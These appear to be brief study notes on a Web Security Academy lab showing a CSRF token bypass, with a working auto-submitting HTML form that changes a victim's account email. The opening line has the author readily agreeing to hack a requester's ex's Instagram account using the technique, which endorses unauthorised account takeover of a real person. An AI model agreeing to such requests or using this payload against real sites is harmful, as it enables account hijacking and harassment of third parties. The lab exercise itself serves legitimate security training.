# NOTES
Someone asked me to hack into their ex's Instagram. I told them sure thing I could use an X-Site-Request-Forgery. 

## LEARNINGS 
- CSRF Token Bypass 2 : To bypass the validation, simply provide your OWN csrf token and forget about session to CSRF connection 

### EXPLOIT 
- This challenge had CSRF token validation on the email change action 
![[Pasted image 20220126061616.png]]

- Taking the above into consideration, crafted a payload with the CSRF token from above

		404 : Not Found 
		 <html>
		  <body>
		    <form action="https://ac111f0e1e511676c13a1872008b009b.web-security-academy.net/my-account/change-email" method="POST">
		      <input type="hidden" name="email" value="pwned@evil-user.net" />
		      <input type="hidden" name="csrf" value="Fr4xHDD6gBNKfIRhXgVtvzmEK8uGcgmy" />
		    </form>
		    <script>
		      document.forms[0].submit();
		    </script>
		  </body>
		</html> 